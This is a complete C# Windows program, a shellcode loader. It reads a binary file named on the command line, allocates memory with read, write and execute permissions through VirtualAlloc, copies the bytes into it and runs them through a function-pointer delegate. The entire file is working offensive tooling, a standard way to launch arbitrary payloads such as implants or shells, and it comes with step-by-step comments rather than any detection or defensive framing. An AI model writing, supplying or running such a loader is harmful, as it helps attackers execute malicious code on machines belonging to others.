using System;
using System.IO;
using System.Runtime.InteropServices;

public class Program
{
    // DllImports for Windows API functions
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    // Memory allocation and protection constants
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40; // Read, Write, Execute permissions

    // Delegate definition for shellcode execution
    // Using StdCall convention as common for Windows shellcode entry points
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RunShellcode();

    public static void Main(string[] args)
    {
        // 1. Validate command-line arguments
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ShellcodeLoader.exe <path_to_shellcode.bin>");
            return;
        }

        byte[] payload;
        string shellcodePath = args[0];

        try
        {
            // 2. Read shellcode from the specified file path
            payload = File.ReadAllBytes(shellcodePath);
            Console.WriteLine(string.Format("Successfully read {0} bytes from {1}", payload.Length, shellcodePath));
        }
        catch (FileNotFoundException)
        {
            Console.WriteLine(string.Format("Error: Shellcode file not found at {0}", shellcodePath));
            return;
        }
        catch (Exception ex)
        {
            Console.WriteLine(string.Format("Error reading shellcode file: {0}", ex.Message));
            return;
        }

        // 3. Allocate executable memory using VirtualAlloc
        // We request MEM_COMMIT (allocate physical storage) and MEM_RESERVE (reserve address space)
        // with PAGE_EXECUTE_READWRITE permissions.
        IntPtr execMem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (execMem == IntPtr.Zero)
        {
            Console.WriteLine(string.Format("Error: VirtualAlloc failed. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        Console.WriteLine(string.Format("Allocated executable memory at 0x{0:X}", execMem.ToInt64()));

        // 4. Copy the shellcode into the allocated executable memory
        Marshal.Copy(payload, 0, execMem, payload.Length);
        Console.WriteLine("Shellcode copied to allocated memory.");

        // 5. Execute the shellcode by creating and invoking a delegate
        RunShellcode func = (RunShellcode)Marshal.GetDelegateForFunctionPointer(execMem, typeof(RunShellcode));
        Console.WriteLine("Executing shellcode...");
        
        try
        {
            func(); // This call will transfer execution to the shellcode
            Console.WriteLine("Shellcode execution finished (or process terminated).");
        }
        catch (Exception ex)
        {
            Console.WriteLine(string.Format("Error during shellcode execution: {0}", ex.Message));
        }

        // 6. Free the allocated memory (this part might not be reached if shellcode exits the process)
        // MEM_RELEASE is used to decommit and release the reserved pages.
        if (VirtualFree(execMem, 0, MEM_RELEASE))
        {
            Console.WriteLine("Memory freed successfully.");
        }
        else
        {
            Console.WriteLine(string.Format("Warning: Failed to free memory. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
        }
    }
}